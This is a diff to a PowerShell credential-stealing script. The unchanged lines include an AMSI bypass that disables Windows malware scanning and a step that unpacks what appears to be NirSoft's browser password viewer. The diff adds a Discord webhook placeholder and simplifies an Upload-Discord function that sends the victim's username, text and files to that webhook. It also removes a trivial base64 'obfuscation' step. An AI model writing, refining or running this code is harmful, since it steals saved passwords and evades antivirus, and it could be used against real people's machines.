@@ -1,3 +1,6 @@
+# Define the Discord webhook directly (no encoding)
+$DiscordUrl = 'Your-Discord-Webhook'
+
 # AMSI Bypass
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
 
@@ -11,7 +14,7 @@ function Get-Nirsoft {
     .\7z\7za.exe e wbpv.zip
 }
 
-# Modify the Upload-Discord function to obfuscate the parameters
+# Simplified Upload-Discord function
 function Upload-Discord {
     [CmdletBinding()]
     param (
@@ -19,20 +22,13 @@ function Upload-Discord {
         [parameter(Position=1, Mandatory=$False)][string]$text 
     )
 
-    # Obfuscate JSON payload creation
-    $username = $env:username
     $Body = @{
-        'username' = $username
+        'username' = $env:username
         'content' = $text
     }
 
-    # Encode the JSON payload
-    $jsonPayload = $Body | ConvertTo-Json
-    $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($jsonPayload))
-    $decodedPayload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPayload))
-
     if (-not ([string]::IsNullOrEmpty($text))){
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post -Body $decodedPayload
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post -Body ($Body | ConvertTo-Json)
     }
 
     if (-not ([string]::IsNullOrEmpty($file))){
